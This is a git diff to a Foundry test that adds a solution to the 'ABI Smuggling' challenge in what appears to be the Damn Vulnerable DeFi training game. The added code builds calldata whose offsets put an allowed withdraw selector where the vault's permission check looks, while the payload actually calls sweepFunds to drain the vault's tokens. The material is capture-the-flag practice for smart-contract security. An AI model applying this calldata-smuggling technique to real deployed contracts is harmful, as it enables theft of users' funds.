@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -73,7 +73,21 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        bytes4 fakeSelector = SelfAuthorizedVault.withdraw.selector;
+        bytes memory actionData = abi.encodeCall(SelfAuthorizedVault.sweepFunds, (recovery, IERC20(address(token))));
+
+        bytes memory payload = abi.encodePacked(
+            AuthorizedExecutor.execute.selector,
+            abi.encode(address(vault)),
+            uint256(0x80),
+            uint256(0),
+            bytes32(fakeSelector),
+            bytes32(actionData.length),
+            actionData
+        );
+        console.logBytes(payload);
+        (bool success,) = address(vault).call(payload);
+        require(success, "Call failed");
     }
 
     /**
